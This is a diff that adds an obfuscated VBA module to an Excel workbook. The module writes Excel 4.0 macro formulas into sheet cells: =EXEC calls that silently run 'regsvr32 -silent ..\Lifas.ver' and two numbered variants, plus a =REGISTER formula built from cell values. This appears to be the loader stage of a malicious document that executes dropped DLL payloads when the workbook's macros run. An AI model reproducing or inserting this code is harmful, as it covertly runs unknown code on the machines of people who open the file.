@@ -1,0 +1,27 @@
+Attribute VB_Name = "Module8"
+Function Biolaster()
+tyht = "J"
+tyht1 = "C"
+tyht2 = "B"
+Sheets("Nneeri").Range("I11") = tyht & tyht & tyht1 & tyht1 & tyht2 & tyht2
+
+End Function
+
+Function kjhkjlkj()
+Jtruhrdrgdg = "regsvr32"
+agadfg = " -silent"
+dfdsaf = " ..\Lifas.ver"
+Sheets("Nneeri").Range("I17") = Jtruhrdrgdg & agadfg & dfdsaf
+Sheets("Nneeri").Range("I18") = Jtruhrdrgdg & agadfg & dfdsaf & "1"
+Sheets("Nneeri").Range("I19") = Jtruhrdrgdg & agadfg & dfdsaf & "2"
+
+Bytruy = "=REGISTER"
+JRyf = "=EXEC"
+Sheets("Nneeri").Range("H17") = JRyf & "(I17)"
+Sheets("Nneeri").Range("H18") = JRyf & "(I18)"
+Sheets("Nneeri").Range("H19") = JRyf & "(I19)"
+Sheets("Nneeri").Range("H9") = Bytruy & "(I9,I10&J10,I11,I12,,1,9)"
+Hrosters
+End Function
+
+
